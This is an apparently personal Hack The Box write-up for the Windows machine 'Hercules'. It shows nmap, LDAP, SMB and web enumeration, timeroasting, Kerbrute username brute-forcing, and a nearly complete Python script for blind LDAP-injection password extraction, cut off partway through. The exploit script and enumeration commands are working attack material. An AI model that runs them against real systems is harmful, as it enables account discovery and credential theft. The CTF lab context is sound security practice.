---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Timeroasting
  - Kerbrute
  - LDAP-Injection
  - LDAPSearch
  - Enum4Linux
  - LFI
  - S4U2Self
  - winrmexec
  - ESC-3
  - Responder
  - ODT
  - Bloodhound
  - BloodyAD
  - Certipy
  - Powerview
  - Shadow-Credential-Attack
  - ADCS
  - GetST
  - impacket-changepasswd
  - GetTGT
  - impacket-getST
  - impacket-describeTicket
---
# Overview

| Name        | Hercules    |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Insane [50] |
| Status      | Done        |

The root flag can be found in the non-default location, `C:\Users\Admin\Desktop`.
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- -T4 10.10.11.91
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-19 00:55 CDT
Stats: 0:01:54 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 68.18% done; ETC: 00:57 (0:00:12 remaining)
Nmap scan report for 10.129.190.4
Host is up (0.0086s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://10.129.190.4/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-19 05:57:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hercules Corp
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
56969/tcp open  msrpc         Microsoft Windows RPC
57157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57163/tcp open  msrpc         Microsoft Windows RPC
58341/tcp open  msrpc         Microsoft Windows RPC
58366/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-19T05:58:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```bash
$ echo "10.10.11.91 hercules.htb dc.hercules.htb" | sudo tee -a /etc/hosts
10.10.11.91 hercules.htb dc.hercules.htb
```

```bash
$ nxc smb hercules.htb -u 'guest' -p '' --shares
SMB         10.10.11.91     445    10.10.11.91      [*]  x64 (name:10.10.11.91) (domain:10.10.11.91) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.91     445    10.10.11.91      [-] 10.10.11.91\guest: STATUS_NOT_SUPPORTED
```
# Enumeration

```bash
$ enum4linux-ng hercules.htb -A
ENUM4LINUX - next generation (v1.3.5)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... hercules.htb
[*] Username ......... ''
[*] Random Username .. 'slarfdfs'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on hercules.htb    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for hercules.htb    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: hercules.htb

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for hercules.htb    |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on hercules.htb    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ===========================================================
|    Domain Information via SMB session for hercules.htb    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[-] Could not enumerate domain information via unauthenticated SMB
[*] Enumerating via unauthenticated SMB session on 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =========================================
|    RPC Session Check on hercules.htb    |
 =========================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_NOT_SUPPORTED
[*] Check for guest access
[-] Could not establish guest session: STATUS_NOT_SUPPORTED
[-] Sessions failed, neither null nor user sessions were possible

 ===============================================
|    OS Information via RPC for hercules.htb    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: unknown
OS version: not supported
OS release: null
OS build: null
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 29.10 seconds
```

```bash
# Check if anonymous LDAP binds work
$ ldapsearch -x -H ldap://hercules.htb -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=hercules,DC=htb
namingcontexts: CN=Configuration,DC=hercules,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=hercules,DC=htb
namingcontexts: DC=DomainDnsZones,DC=hercules,DC=htb
namingcontexts: DC=ForestDnsZones,DC=hercules,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

![[hercules.png]]
## FeroxBuster

```bash
$ feroxbuster -u https://hercules.htb -k -n -t 50 -C 404,403 -x php,asp,aspx,config,txt,log,json,xml,html,htm -o ferox_scan.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://hercules.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_scan.txt
 💲  Extensions            │ [php, asp, aspx, config, txt, log, json, xml, html, htm]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       19l       31w      473c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      484l     2406w   189281c https://hercules.htb/Content/Assets/about-2.jpg
200      GET     3563l    12286w    91398c https://hercules.htb/Content/vendors/isotope/isotope.pkgd.js
200      GET      134l      313w     6572c https://hercules.htb/Content/Assets/logo.svg
200      GET       93l      615w    59733c https://hercules.htb/Content/Assets/avatar.jpg
200      GET      189l     1275w   101147c https://hercules.htb/Content/Assets/blog-2.png
200      GET       81l      384w    31614c https://hercules.htb/Content/Assets/avatar-1.jpg
200      GET       53l      162w     3213c https://hercules.htb/login
200      GET      392l     1931w   171638c https://hercules.htb/Content/Assets/woman-type.jpg
200      GET      467l     1691w    27342c https://hercules.htb/
200      GET       53l      162w     3213c https://hercules.htb/Login
200      GET      467l     1691w    27342c https://hercules.htb/index
301      GET        2l       10w      152c https://hercules.htb/Content => https://hercules.htb/Content/
302      GET        3l        8w      141c https://hercules.htb/Home => https://hercules.htb/Login?ReturnUrl=%2fHome
200      GET      467l     1691w    27342c https://hercules.htb/default
```
## Vhost fuzzing

```bash
$ ffuf -u https://hercules.htb -H "Host: FUZZ.hercules.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fs 27342 -o ffuf_vhosts.txt
```

Nothing.

Went to `/login`.


![[hercules2.png]]

![[hercules3.png]]

Nothing seems to work.
## Timeroasting

```bash
$ nxc smb hercules.htb -u '' -p '' -M timeroast

SMB         10.10.11.91     445    10.10.11.91      [*]  x64 (name:10.10.11.91) (domain:10.10.11.91) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.91     445    10.10.11.91      [-] 10.10.11.91\: STATUS_NOT_SUPPORTED
TIMEROAST   10.10.11.91     445    10.10.11.91      [*] Starting Timeroasting...

TIMEROAST   10.10.11.91     445    10.10.11.91      1000:$sntp-ms$49da367790ff4aa734baca8f91f18fae$1c0111e900000000000a33b94c4f434cec9f3c0d16e00a97e1b8428bffbfcd0aec9f803e670077f5ec9f803e6700ebb8
```

But hash won't crack.
## Kerbrute

```bash
$ git clone https://github.com/insidetrust/statistically-likely-usernames
```

```bash
./kerbrute_linux_amd64 userenum --dc dc.hercules.htb  -d hercules.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 16:24:13 >  Using KDC(s):
2025/10/19 16:24:13 >  	dc.hercules.htb:88

2025/10/19 16:24:13 >  [+] VALID USERNAME:	 admin@hercules.htb
2025/10/19 16:24:15 >  [+] VALID USERNAME:	 administrator@hercules.htb
2025/10/19 16:24:15 >  [+] VALID USERNAME:	 Admin@hercules.htb
2025/10/19 16:24:27 >  [+] VALID USERNAME:	 Administrator@hercules.htb
2025/10/19 16:24:43 >  [+] VALID USERNAME:	 auditor@hercules.htb
```

We got 3 but we need more:

Lets create `firstname.initiallast` format wordlists.

```bash
$ ls
facebook-base-lists  john.smith-at-example.com.txt  john.txt     popular-names.JPG     smithjj.txt        top-formats.txt
jjsmith.txt          john.smith.txt                 jsmith2.txt  README.md             smithj.txt         us-census-base-lists
jjs.txt              johnsmith.txt                  jsmith.txt   service-accounts.txt  smith.txt          weak-corporate-passwords
johnjs.txt           johns.txt                      places.txt   smithj2.txt           test-accounts.txt

[~/statistically-likely-usernames/facebook-base-lists]
└─$ ls
j.j.smith-x100000.txt  john.j.s-x100000.txt  john.smith-x500000.txt  john-x10000.txt      j.smith-x100000.txt  smith.j.j-x100000.txt
j.j.s-x17576.txt       john.s.2-x1000.txt    john.s-x100000.txt      j.smith.2-x5000.txt  smith.j.2-x5000.txt  smith-x10000.txt
```

```bash
$ ./kerbrute_linux_amd64 userenum --dc dc.hercules.htb -d hercules.htb --threads 100 john.s-x100000.txt                                 
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 21:29:43 >  Using KDC(s):
2025/10/19 21:29:43 >   dc.hercules.htb:88

2025/10/19 21:29:43 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:29:44 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:29:44 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:29:44 >  [+] VALID USERNAME:       will.s@hercules.htb
2025/10/19 21:29:45 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 21:29:45 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:29:45 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:29:49 >  [+] VALID USERNAME:       jacob.b@hercules.htb
2025/10/19 21:29:50 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:29:50 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:29:51 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:29:51 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:29:51 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:29:52 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:29:53 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:29:53 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 21:29:54 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:29:54 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:29:54 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 21:29:56 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2025/10/19 21:29:56 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 21:29:56 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 21:29:57 >  [+] VALID USERNAME:       jacob.b@hercules.htb
2025/10/19 21:29:58 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:29:58 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 21:29:59 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:29:59 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2025/10/19 21:30:01 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:30:01 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:01 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 21:30:02 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:05 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:30:07 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:30:08 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:30:08 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:30:08 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:30:11 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:30:13 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:14 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 21:30:14 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:14 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:30:15 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:30:15 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:16 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:16 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:30:17 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:20 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:30:23 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:30:25 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 21:30:27 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:31 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:32 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:30:33 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 21:30:33 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:30:40 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2025/10/19 21:30:44 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:30:45 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:30:45 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:30:45 >  [+] VALID USERNAME:       natalie.a@hercules.htb
2025/10/19 21:30:46 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:30:47 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:30:47 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 21:30:47 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:48 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:30:54 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:54 >  [+] VALID USERNAME:       fiona.c@hercules.htb
2025/10/19 21:30:54 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:30:55 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:55 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:30:57 >  [+] VALID USERNAME:       joel.c@hercules.htb
2025/10/19 21:30:59 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:30:59 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:31:00 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:31:01 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:31:02 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 21:31:03 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 21:31:05 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:31:05 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:31:05 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 21:31:05 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 21:31:05 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 21:31:06 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:31:07 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2025/10/19 21:31:09 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:31:10 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:31:12 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:31:12 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 21:31:12 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:31:13 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:31:14 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:31:15 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:31:18 >  [+] VALID USERNAME:       will.s@hercules.htb
2025/10/19 21:31:24 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:31:25 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 21:31:25 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 21:31:27 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:31:28 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:31:28 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:31:30 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:31:30 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:31:30 >  [+] VALID USERNAME:       fiona.c@hercules.htb
2025/10/19 21:31:31 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 21:31:31 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:31:33 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 21:31:33 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 21:31:34 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 21:31:34 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 21:31:36 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 21:31:36 >  [+] VALID USERNAME:       patrick.s@hercules.htb
<SNIP>
```

Its repeating now on. We get 15 usernames.

```bash
adriana.i
angelo.o
anthony.r
ashley.b
bob.w
camilla.b
clarissa.c
elijah.m
fernando.r
fiona.c
harris.d
heather.s
jacob.b
james.s
jennifer.a
jessica.e
joel.c
johanna.f
johnathan.j
ken.w
mark.s
mikayla.a
natalie.a
nate.h
patrick.s
ramona.l
ray.n
rene.s
shae.j
stephanie.w
stephen.m
tanya.r
taylor.m
tish.c
vincent.g
will.s
winda.s
zeke.s
```
# Initial Foothold
## [LDAP Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/#defaults-attributes")

```python
#!/usr/bin/env python3

import re
import string
import sys
from pathlib import Path
import requests
import urllib3

# Disable SSL warnings since we're dealing with potentially self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Config:
    """Application configuration - stores all target settings and patterns"""
    
    # Target website - change this to your actual target
    TARGET_HOST = "https://hercules.htb"
    
    # Login endpoint where the LDAP injection occurs
    LOGIN_ENDPOINT = "/Login"
    
    # Page where we can get CSRF tokens (usually the login page)
    TOKEN_PAGE = "/login"

    # Whether to verify SSL certificates (False for self-signed certs)
    VERIFY_SSL = False

    # This message appears when LDAP injection works and a user exists
    # The presence of this text means our injection was successful
    VALID_USER_INDICATOR = "Login attempt failed"

    # Regex pattern to extract CSRF token from login page HTML
    # Looks for: <input name="__RequestVerificationToken" type="hidden" value="TOKEN_HERE">
    TOKEN_PATTERN = re.compile(
        r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"',
        re.IGNORECASE,
    )

    # File where extracted passwords will be saved
    OUTPUT_FILE = "extracted_passwords.txt"


class LDAPPayloadBuilder:
    """Builds LDAP injection payloads for blind password extraction"""
    
    # LDAP special characters that need escaping when they appear in the PASSWORD part
    # This prevents the password characters from breaking our LDAP injection
    ESCAPE_CHARS = {
        "*": r"\2a",  # Asterisk in LDAP hex encoding
        "(": r"\28",  # Open parenthesis in LDAP hex encoding  
        ")": r"\29",  # Close parenthesis in LDAP hex encoding
    }

    @staticmethod
    def escape_ldap_chars(value):
        """Escape LDAP special characters in the password/prefix value"""
        # Only escapes characters in the actual password data, not our injection operators
        for char, replacement in LDAPPayloadBuilder.ESCAPE_CHARS.items():
            value = value.replace(char, replacement)
        return value

    @staticmethod
    def create_payload(username, prefix=""):
        """
        Creates the LDAP injection payload for testing password characters
        
        Args:
            username: Target username to test
            prefix: The password characters we've discovered so far
            
        Returns:
            URL-encoded payload string ready for HTTP request
        """
        if prefix:
            # Escape any special LDAP characters in the password prefix
            escaped_prefix = LDAPPayloadBuilder.escape_ldap_chars(prefix)
            # Build injection: username*)(description=PREFIX*
            # This transforms the LDAP query to check if description starts with our prefix
            injection = f"{username}*)(description={escaped_prefix}*"
        else:
            # Initial payload to check if user has any description field
            injection = f"{username}*)(description=*"
        
        # URL encode the entire injection string for HTTP transmission
        # This converts special characters to %XX format
        return "".join(f"%{ord(c):02X}" for c in injection)


class HTTPClient:
    """Handles HTTP requests to the target application"""
    
    def __init__(self, config):
        self.config = config
        self.session = None

    def get_csrf_token(self):
        """Extract CSRF token from the login page - required for form submission"""
        self.session = requests.Session()
        try:
            # Get the login page HTML
            response = self.session.get(
                f"{self.config.TARGET_HOST}{self.config.TOKEN_PAGE}",
                verify=self.config.VERIFY_SSL,
            )
            # Update session cookies
            self.session.cookies.update(response.cookies)
            # Search for CSRF token in the HTML
            match = self.config.TOKEN_PATTERN.search(response.text)
            return match.group(1) if match else None
        except requests.RequestException:
            return None

    def send_login_request(self, username_payload, csrf_token):
        """Send the actual login request with our LDAP injection payload"""
        if not self.session:
            return None

        # Build the login form data
        payload = {
            "Username": username_payload,  # This contains our LDAP injection
            "Password": "invalid",         # Always use invalid password
            "RememberMe": "false",
            "__RequestVerificationToken": csrf_token,  # CSRF protection token
        }

        try:
            # Send POST request to login endpoint
            response = self.session.post(
                f"{self.config.TARGET_HOST}{self.config.LOGIN_ENDPOINT}",
                data=payload,
                verify=self.config.VERIFY_SSL,
            )
            return response.text
        except requests.RequestException:
            return None
        finally:
            # Always close session after request
            self.session.close()
            self.session = None

    def test_condition(self, username, prefix=""):
        """
        Test if a user's description field matches our prefix
        
        Args:
            username: Target username
            prefix: Password characters to test
            
        Returns:
            True if description starts with prefix, False otherwise
        """
        # First get CSRF token for this request
        token = self.get_csrf_token()
        if not token:
            return False

        # Build the LDAP injection payload
        payload = LDAPPayloadBuilder.create_payload(username, prefix)
        # Send the login request with our payload
        response_text = self.send_login_request(payload, token)

        if not response_text:
            return False

        # Check if our injection worked - "Login attempt failed" means user exists
        # and our LDAP condition was true (description matches our prefix)
        return self.config.VALID_USER_INDICATOR in response_text


class PasswordEnumerator:
    """Enumerates passwords character by character using blind LDAP injection"""
    
    # Character set to test, in order of likelihood
    # Starts with lowercase, then digits, then uppercase, then special characters
    CHARSET = (
        string.ascii_lowercase +   # abcdefghijklmnopqrstuvwxyz
        string.digits +            # 0123456789
        string.ascii_uppercase +   # ABCDEFGHIJKLMNOPQRSTUVWXYZ
        "!@#$_*-." +              # Common special characters
        "%^&()=+[]{}|;:',<>?/`~\" \\"  # Less common special characters
    )

    def __init__(self, http_client, config):
        self.client = http_client
        self.config = config

    def check_has_description(self, username):
        """Check if the user has any description field at all"""
        # Uses empty prefix to test: username*)(description=*
        # Returns True if user has any description field
        return self.client.test_condition(username, "")

    def extract_password(self, username, max_len=80):
        """
        Extract password from user's description field character by character
        
        Args:
            username: Target username
            max_len: Maximum password length to try
            
        Returns:
            Extracted password or None if not found
        """
        print(f"\n[*] Target: {username}")

        # First check if user has a description field
        if not self.check_has_description(username):
            print(f"[-] No description field found for {username}")
            return None

        print("[+] Description field exists, extracting password...")

        extracted = ""  # Characters we've discovered so far
        consecutive_failures = 0  # Track when we can't find more characters

        # Try each character position up to maximum length
        for pos in range(max_len):
            char_found = False

            # Test each possible character in our charset
            for test_char in self.CHARSET:
                # Build candidate password: what we have + new test character
                candidate = extracted + test_char
                
                # Test if description starts with our candidate
                if self.client.test_condition(username, candidate):
                    # Success! This character is correct
                    extracted += test_char
                    print(f"    [{pos}] '{test_char}' -> {extracted}")
                    char_found = True
                    consecutive_failures = 0  # Reset failure counter
                    break  # Move to next position

            # If no character worked for this position
            if not char_found:
                consecutive_failures += 1
                # If we fail 5 positions in a row, assume password is complete
                if consecutive_failures >= 5:
                    break

        # Check if we found anything
        if extracted:
            print(f"[+] EXTRACTED: {username} => {extracted}")
            return extracted

        return None


def load_user_list(file_path=None):
    """
    Load list of usernames to test
    
    Args:
        file_path: Optional file containing usernames (one per line)
        
    Returns:
        List of usernames to test
    """
    if file_path and Path(file_path).exists():
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]

    # Default user list if no file provided
    return [
        "adriana.i", "angelo.o", "anthony.r", "ashley.b", "auditor",
        "bob.w", "camilla.b", "clarissa.c", "elijah.m", "fernando.r",
        "fiona.c", "harris.d", "heather.s", "jacob.b", "james.s",
